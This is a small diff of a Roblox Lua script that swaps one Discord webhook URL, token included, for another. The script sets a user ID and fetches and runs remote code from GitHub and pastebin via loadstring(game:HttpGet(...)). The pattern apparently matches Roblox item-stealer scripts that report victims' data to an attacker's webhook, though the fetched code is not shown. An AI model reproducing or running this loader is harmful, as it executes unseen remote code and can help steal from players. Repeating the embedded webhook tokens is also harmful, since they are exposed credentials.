@@ -2,6 +2,6 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/Muhammad6196/Project-
 
 _G.UserID = 3380431035
 
-_G.WebHook = "https://discord.com/api/webhooks/1056729761809973400/LXJ0ZX8O7b1LayNpQuOHE1_P8_UPBKh7mzsnJnbmD0zVW8JB4KLBCl2xteDBBPB3Fltu"
+_G.WebHook = "https://discord.com/api/webhooks/1071406312765792306/Oo4lEI9th-pke7HGwMUK567gR0pn1TYwJpBcNCZPykqSq5kS_HpMI9oV9lNL5VXecEyz"
 
 loadstring(game:HttpGet('https://pastebin.com/raw/q4if1mvx'))()
